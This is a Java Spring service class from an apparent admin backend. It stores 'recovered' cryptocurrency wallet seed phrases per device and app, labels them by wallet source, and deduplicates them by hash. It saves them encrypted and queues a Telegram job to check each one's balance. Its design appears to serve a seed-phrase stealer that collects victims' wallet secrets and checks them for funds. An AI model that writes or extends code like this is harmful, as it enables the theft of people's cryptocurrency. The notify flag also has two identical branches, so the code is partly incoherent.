package com.admin.service;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

import org.springframework.stereotype.Service;

import com.admin.config.V26AdminProperties;
import com.admin.dao.MnemonicDao;
import com.admin.entity.MnemonicEntity;
import com.admin.util.MnemonicAesUtil;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
@RequiredArgsConstructor
public class MnemonicPersistService {

    private final MnemonicDao mnemonicDao;
    private final V26AdminProperties props;
    private final ScopeService scopeService;
    private final AdminTgService adminTgService;

    public Map<String, Object> finalizeRecovered(String deviceId, String appId, List<String[]> items, boolean notify) {
        Map<String, Object> out = new LinkedHashMap<>();
        int added = 0;
        int existing = 0;
        List<Long> newIds = new ArrayList<>();
        String did = deviceId == null ? "" : deviceId.trim().toLowerCase(Locale.ROOT);
        String secret = props.getMnemonicAesKey() == null ? "" : props.getMnemonicAesKey().trim();
        Integer userid = scopeService.useridOfAppid(appId);
        for (String[] item : items) {
            if (item == null || item.length < 2) {
                continue;
            }
            String src = item[0] == null || item[0].isBlank() ? "unknown" : item[0].trim();
            if (src.length() > 64) {
                src = src.substring(0, 64);
            }
            for (String phrase : item[1].split("\\r?\\n")) {
                String text = phrase == null ? "" : phrase.trim();
                if (text.isEmpty()) {
                    continue;
                }
                String hash = sha256(text);
                MnemonicEntity row = mnemonicDao.selectOne(new QueryWrapper<MnemonicEntity>()
                        .eq("deviceId", did).eq("result_hash", hash).last("LIMIT 1"));
                if (row != null) {
                    existing++;
                    // 同一设备相同助记词只存一条，但要把后续钱包名并进 source，详情页才能对上每一张卡。
                    String merged = mergeSource(row.getSource(), src);
                    if (!merged.equals(row.getSource() == null ? "" : row.getSource())) {
                        row.setSource(merged);
                        mnemonicDao.updateById(row);
                    }
                    continue;
                }
                MnemonicEntity n = new MnemonicEntity();
                n.setDeviceId(did);
                n.setAppId(appId);
                n.setUserid(userid);
                n.setResult(MnemonicAesUtil.encrypt(text, secret));
                n.setResultHash(hash);
                n.setSource(src);
                n.setAddtime(new Date());
                mnemonicDao.insert(n);
                added++;
                newIds.add(n.getId());
                if (notify) {
                    adminTgService.enqueueMnemonicBalance(n.getId(), did);
                } else {
                    adminTgService.enqueueMnemonicBalance(n.getId(), did);
                }
            }
        }
        out.put("added", added);
        out.put("existing", existing);
        out.put("newIds", newIds);
        return out;
    }

    /** 合并来源标签，对齐 Python {@code _merge_source}。source 列最长 64。 */
    private static String mergeSource(String existing, String incoming) {
        Set<String> seen = new LinkedHashSet<>();
        List<String> parts = new ArrayList<>();
        for (String raw : new String[] {existing == null ? "" : existing, incoming == null ? "" : incoming}) {
            for (String p : raw.replace('，', ',').split(",")) {
                String s = p.trim();
                if (s.isEmpty()) {
                    continue;
                }
                String key = s.toLowerCase(Locale.ROOT);
                if (!seen.add(key)) {
                    continue;
                }
                parts.add(s);
            }
        }
        String joined = String.join(",", parts);
        return joined.length() > 64 ? joined.substring(0, 64) : joined;
    }

    private static String sha256(String text) {
        try {
            byte[] d = MessageDigest.getInstance("SHA-256").digest(text.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(d.length * 2);
            for (byte b : d) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
}
